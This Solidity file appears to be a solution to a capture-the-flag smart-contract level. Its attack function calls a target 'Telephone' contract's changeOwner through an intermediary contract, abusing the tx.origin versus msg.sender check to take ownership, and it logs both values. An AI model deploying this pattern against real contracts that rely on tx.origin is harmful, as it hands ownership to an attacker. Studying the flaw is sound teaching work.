// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../prob/Telephone/Telephone.sol";

import "hardhat/console.sol";

contract TelephoneCaller {
    constructor () {
          console.log("++++[TelephoneCaller Consrtuctor] tx.origin:  ", tx.origin);
          console.log("++++[TelephoneCaller Consrtuctor] msg.sender: ", msg.sender);
    }

    function attack(address _target, address _player) public {

        console.log("++++(1) [TelephoneCaller] tx.origin:  ", tx.origin);
        console.log("++++(1) [TelephoneCaller] msg.sender: ", msg.sender);

        Telephone telephone = Telephone(_target);

        telephone.changeOwner(_player);
    }
}
